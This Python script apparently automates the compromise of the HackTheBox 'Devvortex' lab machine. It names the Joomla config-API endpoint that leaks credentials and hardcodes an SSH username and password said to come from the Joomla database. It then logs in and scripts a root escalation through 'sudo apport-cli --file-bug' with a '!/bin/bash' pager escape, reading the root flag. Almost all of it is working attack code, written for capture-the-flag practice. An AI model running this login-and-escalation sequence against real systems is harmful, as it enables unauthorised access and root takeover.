
import sys
import time as cm
import subprocess
import paramiko
import paramiko.ssh_exception
from pwn import *
import requests
import re
import socket
from bs4 import BeautifulSoup
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    bnn = """
                                                  ______
                                               .-"      "-.       ▓█████ ▄████▄   ██░ ██  ██ ▄█▀    
                                              /            /      ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒            
                                             |              |     ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░        
                                             |,  .-.  .-.  ,|     ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ 
                                             | )(_o/  \o_)( |     ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄
                                             |/     /\     \|     ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒  
                                   (@_       (_     ^^     _)      ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░
                              _     ) \_______\__|IIIIII|__/_____  ░  ░         ░  ░░ ░░ ░░ ░ 
                             (_)@8@8{}<________|-\IIIIII/-|___________________________>
                                    )_/        \          /
                                   (@           `--------`
    """
    print(Fore.GREEN + f"{bnn}")
    

global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.242"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")
        

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t\t[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Exploit] > " + Fore.YELLOW + f"http://dev.devvortex.htb/api/index.php/v1/config/application?public=true")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Devvortex Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")


def unlocked(): 
    try:
        checker_status()
        user_default_hackthebox()
        
        # Menu seleccionar usuario a conectarse. www-data, jimmy, joanna, root
        while True:
            users=["logan", "root", "exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "logan"
            password = "tequieromucho"
            
            print(Fore.MAGENTA + f"\n\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t~ What ur user select? > "))
            
            
            if user_call == 1:
                try:
                    print(Fore.CYAN + f"\n\t\t\t ~ [Connection to logan :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credential Path] > " + Fore.GREEN + f"Enumeration MySQL - [DB - joomla]")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {username}, Password: {password}")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - By obtaining id_rsa file] > " + Fore.GREEN + f" Waiting...")             
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        time.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")

                    shell.close()
                    client.close()
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
                

            elif user_call == 2:
                print(Fore.CYAN + f"\n\t\t ~ [Connection to root :)]\n")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.BLUE + f"$ Connecting to logan.")
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password)
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Wait for flag root.")
                #init shell
                shell = client.invoke_shell()
                cm.sleep(3)
                shell.settimeout(1)
                shell.send("ls" + "\n")
                shell.send("cat user.txt" + "\n")
                cm.sleep(2)
                shell.send("sudo /usr/bin/apport-cli --file-bug" + "\n")
                cm.sleep(2)
                shell.send('tequieromucho' + "\n")
                shell.send('1' + "\n")
                cm.sleep(2)
                shell.send('2' + "\n")
                cm.sleep(10)
                shell.send('V' + "\n")
                cm.sleep(10)
                shell.send('!/bin/bash' + '\n')
                cm.sleep(5)
                root_flag=shell.send('cat /root/root.txt > flag' + '\n')
                # Leer la salida del comando
                cm.sleep(2)
                shell.send("echo" + "\n")
                cm.sleep(2)
                shell.send('cat flag' + "\n")
                cm.sleep(3)
                output = shell.recv(5000).decode('utf-8')
                print(output.strip())
                break
            
            elif user_call == 3:
                print(Fore.GREEN + f"\n\t\t\t\t\t\t[Exploit Message - Exit Pwned] :/")
                print(Fore.GREEN + f"\t\t\t\t\t\t        [G00d H4ck1ng :@ ]\n")
                break
            else:
                break
    except subprocess.CalledProcessError as e:
        print(f"Function main {e}")

if __name__ == '__main__':
    banner()   
    unlocked()
